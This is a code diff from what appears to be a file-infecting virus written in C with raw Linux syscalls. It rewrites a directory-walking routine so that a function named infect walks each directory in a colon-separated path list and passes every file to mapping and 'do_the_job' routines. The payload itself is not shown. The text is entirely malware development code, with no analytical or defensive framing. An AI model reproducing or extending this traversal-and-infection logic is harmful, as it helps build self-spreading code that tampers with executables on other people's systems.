@@ -57,6 +57,7 @@ type name(type1 arg1,type2 arg2, type3 arg3, type4 arg4)\
 
 __syscall3(size_t, read, int, fd, void *, buf, size_t, count);
 __syscall2(int, munmap, void *, addr, size_t, length);
+__syscall2(int, fstat, int, fildes, struct stat * , buf);
 __syscall3(int, open, const char *, pathname, int, flags, mode_t, mode);
 __syscall3(int, getdents64, int, fd, void *, dirp,  uint, count);
 __syscall3(ssize_t, write, int, fd, const void *, buf, size_t, count);
@@ -216,48 +217,21 @@ int do_the_job(t_file *file)
 	return 0;
 }
 
+
 int open_directory(const char *path)
-{
-	t_file file;
-	char path_file[256];
-	DIR* rep = NULL;
-	struct dirent* dirent;
-	printf("directory: '%s'\n",path);
-	if ((rep = opendir(path)) == NULL)
-		return 1;
-	while((dirent = readdir(rep)))
-	{
-		size_t len;
-		len = ft_strlen(path);
-		ft_memmove(path_file,path,len);
-		path_file[len] = '/';
-		ft_memmove(path_file + len + 1,dirent->d_name, ft_strlen(dirent->d_name));
-		path_file[len + 1 + ft_strlen(dirent->d_name)] = '\0';
-		//printf("%s %s\n",dirent->d_name,path_file);
-		if (open_map(path_file,&file) == 0)
-		{
-			do_the_job(&file);
-			close(file.fd);
-			munmap(file.data,file.size);
-		}
-
-	}
-	return (0);
-}
-
-int open_directory_2(const char *path)
 {
 	int dd,nread;
 	char buf[128];
+	char path_file[256];
+	t_file file;
 	int i = 0;
 	struct linux_dirent64 *d;
 	char *host;
+	size_t len;
 
-if (path)
-{
-	;
-}
-	dd = open (".\0", 0x10000,0);
+	printf("directory: '%s'\n",path);
+
+	dd = open (path, 0x10000,0);
 	if (dd < 0)
 		return 1;
 	nread = getdents64(dd, buf, 128);
@@ -269,12 +243,22 @@ if (path)
 		printf("host %s type %d\n",host, d->d_type);
 		if (host[0] == '.')
 			continue;
-
+		len = ft_strlen(path);
+		ft_memmove(path_file,path,len);
+		path_file[len] = '/';
+		ft_memmove(path_file + len + 1,d->d_name, ft_strlen(d->d_name));
+		path_file[len + 1 + ft_strlen(d->d_name)] = '\0';
+		printf("%s %s\n",d->d_name,path_file);
+		if (open_map(path_file,&file) == 0)
+		{
+			do_the_job(&file);
+			close(file.fd);
+			munmap(file.data,file.size);
+		}
 	}
-	exit(4);
+	close(dd);
 
-	printf("fin open_dir2\n");
-	exit(4);
+	//printf("fin open_dir2\n");
 	return 0;
 }
 
@@ -289,7 +273,7 @@ int infect(char path[],size_t path_length)
 		{
 			path[i] = '\0';
 			//open_directory(&path[i] - length_path);
-			open_directory_2(&path[i] - length_path);
+			open_directory(&path[i] - length_path);
 			//write(1,&path[i] - length_path, length_path);
 			//write(1,"\n",1);
 			path[i] = ':';
@@ -298,7 +282,7 @@ int infect(char path[],size_t path_length)
 		else if (path[i] == '\0')
 		{
 			if (length_path)
-				open_directory_2(&path[i] - length_path);
+				open_directory(&path[i] - length_path);
 			break ;
 		}
 		i++;
